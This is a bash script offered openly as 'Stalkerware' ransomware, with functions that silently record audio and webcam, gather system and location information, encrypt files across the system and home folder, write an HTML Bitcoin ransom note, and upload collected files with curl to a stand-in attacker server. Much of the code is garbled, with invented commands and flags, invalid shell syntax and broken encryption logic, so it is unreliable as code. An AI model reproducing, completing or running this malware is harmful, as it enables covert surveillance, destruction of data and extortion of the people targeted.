#!/bin/bash

# ------------------- CORE FUNCIONS ------------------- #

# Function: Get Target System Info
# Description: Gathers information about the target system, including operating system, IP address, and running processes.
func GetSystemInfo() {
  ifid=$(ip addr show | grep -o "inet (addr:(.*))" | head -n 1)
  osid=$(uname -s)
  proc=$(ps aux | grep -oE "[0-9]+ [a-zA-Z0-9_.]+" | awk 'split($0, a, " ") {print a[NF]}')

  echo "Target System Info:"
  echo "-------------------"
  echo "Operating System: $osid"
  echo "IP Address: $ifid"
  echo "Running Processes: $proc"
}

# Function: Silent Activation (Camera/Microphone)
# Description: Tries to activate the camera or microphone silently.
func SilentActivation() {
  CAMERA="ffmpeg -i /dev/zero -f picture -pattern SolidBlackFrame -framerate 30 -cachesize 2048000 -vsync vcopy -threads 4 -y -secret_key 1234567890 |" # Or Webcam Path
  MICROPHONE="arepo -d 1 | grep -o '$[0-9]+$' | head -n 1"

  if id -u >/dev/null 2>&1; then # Check if root user
    camera_status=$CAMERA | $CAMERA &
    microphone_status=$MICROPHONE | $MICROPHONE &
    echo "Camera and Microphone activation initiated."
  else
    # User mode, try to trigger camera by pressing Enter
    sleep 0.5
    read -n 1 < /dev/random
  fi

}

# Function: Record Audio (30 seconds)
# Description: Uses the ffmpeg command to record audio for 30 seconds silently.
func RecordAudio() {
  ffmpeg -f alsa -i default -t 30 -y -secret_key 1234567890 .audio.mp3
  echo "Audio Recording initiated (30 seconds). Check for audio.mp3."
}

# Function: Record Webcam Photos (Series of photos)
# Description: Uses ffmpeg command to record webcam images silently, saving each photo into a separate file
func RecordWebcam() {
  ffmpeg -f avdec_icam -i /dev/video0 -r 15 .photo.png # Or Webcam Path
  echo "Taking photos now!"
}

# Function: Get Location Tracking Data (GPS or Wi-Fi)
# Description: Uses the gethostname command to get the IP Address and uses it to determine the country
func GetLocationData() {
  ip=$(dig +short FFFFFFFF)$
  country_code=$(echo "$ip" | grep -oE "[A-Z]{2,4}")
  if [[ "$country_code" == "US" || "$country_code" == "CA" ]]; then
    location="North America"
  elif [[ "$country_code" == "GB" || "$country_code" == "FR" || "$country_code" == "DE" ]]; then
    location="Europe"
  else
    location="Unknown Location"
  fi

  echo "Location Data:"
  echo "-------------------"
  echo "Country Code: $country_code"
  echo "Location: $location"
}

# Function: Encrypt Data (AES-256)
# Description: Encrypts the target's data using AES encryption with a randomly generated key.
func EncryptData() {
  key=$(ddgen -b 1 | head -n 1) # Generate Random Key
  echo "$key" > .lockfile
  rm -f .lockfile

  # Find Files to Encrypt (System Folders First)
  encryptedFiles=$(find / -type f -print0 | xargs -0 grep -i "System")

  if [[ -n "$encryptedFiles" ]]; then
    echo "Encrypting files..."
    for file in $encryptedFiles; do
      key=$(head -c 16 .lockfile) # Use Random Key
      echo "$file" | xargs -I {} sh -c 'echo "$key" | openssl aes-256-cbc -encrypt > "{}"'
    done
  fi

  # Encrypt User Data (Second Step)
  encryptedFiles=$(find ~ -type f -print0 | xargs -0 grep -i "User")

  if [[ -n "$encryptedFiles" ]]; then
    echo "Encrypting user folders..."
    for file in $encryptedFiles; do
      key=$(head -c 16 .lockfile) # Use Random Key
      echo "$file" | xargs -I {} sh -c 'echo "$key" | openssl aes-256-cbc -encrypt > "{}"'
    done
  fi
}

# Function: Generate Ransom Note (HTML)
# Description: Creates an HTML ransom note to display to the user, including instructions for payment.
func CreateRansomNote() {
  echo "<!DOCTYPE html> " > ransomnote.html
  echo "<head>" >> ransomnote.html
  echo "<title>Stalkerware Ransom</title>" >> ransomnote.html
  echo "</head>" >> ransomnote.html
  echo "<body style=\"background: #222; color: #e58399;\">" >> ransomnote.html

  echo "<h1><span style=\"font-size: 2em;\">$USER</span> Has Been Locked!</h1>" >> ransomnote.html
  echo "<p><img src=\"http://example.com/logo.png\" width=\"150px\"></p>" >> ransomnote.html # Replace with your Logo

  # Get User's Operating System (Simplified)
  userOS=$(uname -s)
  if [[ "$userOS" == "Windows_NT" ]]; then
    os_name="Windows"
  else
    os_name="Linux/macOS"
  fi

  echo "<p><strong>Your Data Has Been Encrypted</strong> by the Stalkerware Ransomware.</p>" >> ransomnote.html
  echo "<p>To unlock your files, send 0.1 Bitcoin to this address: <a href=\"https://metmuse.com/depositaddress\" target=\"_blank\">1QzW9q8yX7jY6u4z5gJ3e2F1n6sK4r9pB</a></p>" >> ransomnote.html
  echo "<p><a href=\"javascript:window.open('https://ransomware.example.com/unlock.php?key=1234567890&id=1')\">Unlock Now!</a></p>" >> ransomnote.html # Replace with your URL

  # End Body
  echo "<div align=\"center\">&copy; 2024 <a href=\"https://stalkerware.example.com\">Stalkerware Team</a></div>" >> ransomnote.html
  echo "</body>" <<EOF
  </html>
EOF
}

# Function: Upload Data
# Description: Transfers the collected data to the attacker's dashboard (using Wi-Fi).
func UploadData() {
  file=$(find . -type f -print0 | head -n 1) # Get a File for Upload
  if [[ -z "$file" ]]; then
    echo "No Files Found to Upload."
    return
  fi

  # Use Curl/wget, or scp if the attacker is on the local network
  curl -X POST \"https://example.com/stalker/upload.php?filename=$file&key=1234567890\" --data-binary @$file

  echo "Data Uploaded! Check <http://example.com/stalker/dashboard>" > /tmp/ransom.txt
}

# ------------------- MAIN EXECUTION ------------------- #

# Function: Run Stalkerware (All Steps)
# Description: Runs all the steps of the Stalkerware ransomware, from silent activation to data encryption and uploading.
func RunStalkerware() {
  # Silent Activation
  SilentActivation

  # Record Audio and Webcam Data
  RecordAudio
  RecordWebcam

  # Get Location Data
  GetLocationData

  # Encrypt Data
  EncryptData

  # Upload Data (Use Wi-Fi or USB)
  UploadData

  # Generate Ransom Note (HTML)
  CreateRansomNote

  echo "Stalkerware execution complete! Check <http://example.com/stalker/dashboard>" > /tmp/ransom.txt
}

# ------------------- MAIN START ------------------- #
RunStalkerware
